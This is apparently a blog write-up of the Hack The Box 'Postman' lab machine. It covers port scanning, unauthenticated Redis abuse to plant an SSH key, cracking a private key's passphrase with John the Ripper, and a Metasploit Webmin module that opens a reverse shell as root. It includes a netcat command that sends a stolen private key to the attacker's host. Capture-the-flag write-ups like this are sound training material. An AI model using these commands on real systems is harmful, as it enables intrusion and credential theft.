---
layout: single_c
title:  "Hack The Box - Postman Writeup"
date:   2019-10-17 10:43:16 +0530
categories: OSCP
tags: HTB
classes: wide
---
### Hack The Box - Postman

## Enumeration
Lets start by enumerating

#### Nmap
```bash
root@kali:~# nmap -sC -sV 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-11 17:22 IST
Nmap scan report for 10.10.10.160
Host is up (0.63s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http          Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
2222/tcp  open  EtherNetIP-1?
10000/tcp open  http          MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.01 seconds
```
So we have `SSH`, an `apache` server running on port `80` and a `webmin` server running on port `10000`.  

There is an additional service running on this box, a `redis` service. But for some reason, it was not showing up on my `nmap` scans. I had to do separate `nmap` scan to find it.
```bash
root@kali:~/Desktop/htb/postman# nmap -sC -sV 10.10.10.160 -p 6379
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-14 12:42 IST
Nmap scan report for 10.10.10.160
Host is up (0.36s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 4.0.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.99 seconds
```

#### Searchsploit


## Vulnerability

First lets see if this `redis` server allows unauthenticated access.

It does, so lets use the following method gain access. [Redis Vulnerability](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html)

1. Create a `ssh` key pair.
2. Write two empty lines at the beginning and end of the public key.
3. Copy out public key to the `redis` server.
4. Write our public keys to `authorized_keys`.
5. `SSH` into the box using our private key.

## Exploit

I combined the above mentioned steps into a small script. This was necessary because I was connected to the free server and everyone was trying to write their own public keys at the same time.

```
```

```bash
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Dec 14 13:54:56 2019 from 10.10.15.13
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```
And we have a low privilege shell.

## Enumeration 2

The first thing I did was to run `LinEnum.sh`. But it did not yield any useful results. After searching around a bit, I finally found something useful.

```bash
redis@Postman:/opt$ find  / -name "*.bak" 2>/dev/null
/opt/id_rsa.bak
/var/backups/group.bak
/var/backups/gshadow.bak
/var/backups/shadow.bak
/var/backups/passwd.bak
redis@Postman:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Sep 11 11:28 .
drwxr-xr-x 22 root root 4096 Aug 25 15:03 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak
```
Looks like we have some interesting backup files belonging to user `Matt` . The `ssh` backup files permissions seems to be lax. Lets copy it to our machine.
```bash
redis@Postman:/opt$ which nc
/bin/nc
redis@Postman:/opt$ nc 10.10.15.124 1441 < id_rsa.bak 
redis@Postman:/opt$ nc  -w 3 10.10.15.124 1441 < id_rsa.bak 
```
On further inspection, the private key seems to be protected with a pass phrase. Lets see if we can crack it using `JTR`
```
redis@Postman:/opt$ less id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
```
#### John The Ripper

```
root@kali:~/Desktop/htb/postman# john --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/htb/postman/crackjohnssh
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (./postman/file.bak)
1g 0:00:00:05 15.89% (ETA: 21:14:19) 0.1992g/s 497399p/s 497399c/s 497399C/s zinika..zini25
1g 0:00:00:26 DONE (2019-12-14 21:14) 0.03743g/s 536941p/s 536941c/s 536941C/sa6_123..*7¡Vamos!
Session completed
```

`SSH`ing into the box using this private file doesn't seems to work. Lets see if we can use this credential somewhere else.
Lets try this credentials in the `webmin` login page.

## Privilege Escalation

There was a authenticated exploit available for `webmin`. Lets try using that.

```bash
root@kali:~/Desktop/htb/postman# msfconsole
                                                  

 ______________________________________________________________________________
|                                                                              |
|                          3Kom SuperHack II Logon                             |
|______________________________________________________________________________|
|                                                                              |
|                                                                              |
|                                                                              |
|                 User Name:          [   security    ]                        |
|                                                                              |
|                 Password:           [               ]                        |
|                                                                              |
|                                                                              |
|                                                                              |
|                                   [ OK ]                                     |
|______________________________________________________________________________|
|                                                                              |
|                                                       https://metasploit.com |
|______________________________________________________________________________|


       =[ metasploit v5.0.62-dev                          ]
+ -- --=[ 1949 exploits - 1090 auxiliary - 334 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


msf5 > use exploit/linux/http/webmin_packageup_rce 
msf5 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
ssl => true
msf5 exploit(linux/http/webmin_packageup_rce) > set verbose true
verbose => true
msf5 exploit(linux/http/webmin_packageup_rce) > set lhost 10.10.15.124
lhost => 10.10.15.124
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts 10.10.10.160
rhosts => 10.10.10.160
msf5 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.15.124:4444 
[+] Session cookie: cbc87d23b18e4a0f0d78f4a6e83fb77d
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.15.124:4444 -> 10.10.10.160:46884) at 2019-12-14 21:53:01 +0530
id

uid=0(root) gid=0(root) groups=0(root)
```

And we are root!